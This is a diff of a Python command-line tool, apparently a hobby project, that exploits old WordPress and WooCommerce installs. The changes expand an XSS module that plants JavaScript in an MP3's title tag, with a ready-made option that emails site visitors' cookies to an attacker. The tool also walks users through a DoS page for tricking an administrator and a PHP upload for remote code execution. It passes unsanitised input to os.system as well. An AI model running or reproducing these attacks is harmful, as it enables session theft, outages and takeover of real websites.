@@ -1,7 +1,7 @@
 #Wordpress exploiting tool designed by DavideCube
 #Works on Wordpress version <= 4.5.3 and the WooCommerce Plugin version
 from bs4 import BeautifulSoup
-from mutagen.id3 import ID3, TIT2
+from mutagen.easyid3 import EasyID3
 import mutagen
 import re
 import urllib.request
@@ -80,8 +80,8 @@ while not(choice_num == 99):
 	choice = input("Please choose which available exploit to execute: ")
 
 	if not(choice.isdigit() and int(choice) == 99):
-		while not(Support.is_valid_number(choice)) or my_list[int(choice)-1].executable == 0:
-			if not(Support.is_valid_number(choice)):
+		while not(Support.is_valid_number(choice, 1, 4)) or my_list[int(choice)-1].executable == 0:
+			if not(Support.is_valid_number(choice, 1, 4)):
 				print("You must insert a number between 1 and 4.")
 				choice = input("Please choose which available exploit to execute: ")
 			else:
@@ -102,6 +102,7 @@ while not(choice_num == 99):
 		password = input(" - Insert password: ")
 		os.system("sh modules/dos.sh " + url + " " + username + " " + password)
 		print(" - DOS attack performed succesfully on target " + url)
+		print("   ------------------------------------------------------------------")
 		print("\n")
 
 	# XSS with MP3
@@ -110,14 +111,58 @@ while not(choice_num == 99):
 		print("   *                        XSS attack                              *")
 		print("   ******************************************************************") 
 		print(" - This XSS attack exploits the vulnerability in the playlist functionality of wordpress.")
+		print(" - The attacker should have at least author privileges.")
 		print(" - This issue can be exploited by uploading a malicious MP3 file into a wordpress playlist within a file.")
 		print(" - The attacker can put any javascript code inside the meta information of an audio file.")
-		js_code = input("Insert here the javascript code you want to inject: ")
-		title = "Hacking in the deep                                                      </noscript>" + js_code
+		print(" - This exploit will automatically create the MP3 file for you.")
+		#js_code = input("Insert here the javascript code you want to inject: ")
+		#title = "Hacking in the deep                                                      </noscript>" + js_code
+		prefix_title = "Hacking in the deep                                                      </noscript>"
+		print("   ------------------------------------------------------------------")
+		print(" - Possible actions: ")
+		print(" 1) Insert manually your javascript code (<script> tag included)")
+		print(" 2) Read javascript code from a file (<script> tag included)")
+		print(" 3) Try our prepared example")
+		
+		option = input(" - Select which option you prefer: ")
+		
 
-		audio = ID3("modules/xss.mp3")
-		audio.add(TIT2(encoding=3, text=title))
-		audio.save("modules/xss.mp3")
+		while not(Support.is_valid_number(option, 1, 3)):
+			print(" - Please insert a number between 1 and 3")
+			option = input(" - Select which option you prefer: ")
+		
+
+		option_num = int(option)
+		print("   ------------------------------------------------------------------")
+		if option_num == 1:
+			script = input(" - Insert here your javascript code: ")
+		elif option_num == 2:
+			#todo
+			path_file = input(" - Insert here the complete path of the file: ")
+			f = open(path_file, "r")
+			lines = f.readlines() #read the lines
+
+			ultimateLine = ""
+
+			for line in lines: #create a single string
+				ultimateLine = ultimateLine + " " + line.rstrip()
+
+			ultimateLine = ultimateLine.replace('"', '\\"')
+			script = ultimateLine
+		else:
+			print(" - For this example, we prepared a javascript code that sends an email with the cookies of the users visiting the wordpress site.")
+			user_mail = input(" - Insert here the mail address: ")
+			script =  Support.mail_xss(user_mail)
+
+		title = prefix_title + script
+		audio = EasyID3("modules/xss.mp3")
+		audio['title'] = title
+		audio.save()
+		print("   ------------------------------------------------------------------")
+		print(" - At this point, the MP3 file is created and stored in the modules folder.")
+		print(" - Create a post in the wordpress site, and create a playlist.")
+		print(" - Add the MP3 file in the playlist and the javascript code in injected.")
+		print("   ------------------------------------------------------------------")
 
 		print("\n")
 
@@ -142,6 +187,7 @@ while not(choice_num == 99):
 		print(" - At this point a file dos.html is generated in the modules folder.") 
 		print(" - Move the html file on a reachable server. ")
 		print(" - Convince an administrator to visit that webpage. This would perform a DOS attack.")
+		print("   ------------------------------------------------------------------")
 		print("\n")
 
 	# RCE with file upload
@@ -158,11 +204,15 @@ while not(choice_num == 99):
 		print(" - You can upload whatever file you want, including files containing code instruction you want to execute on the server side.")
 		print(" - As a demonstration, upload the file rce.php that you find in the modules folder.")
 		print(" - Visit the " +url+"/wp-content/uploads/catalog_enquiry/[name of your file] folder to access the content of your uploaded file")
+		print("   ------------------------------------------------------------------")
 		print("\n")
 
 	elif choice_num == 99:
-		print("Thank you for using the wordpressing tool!")
-		print("\n")
+		print("   Thank you for using the wordpressing tool!")
+		print("   ------------------------------------------------------------------")
+
+
+	
 
 	
 
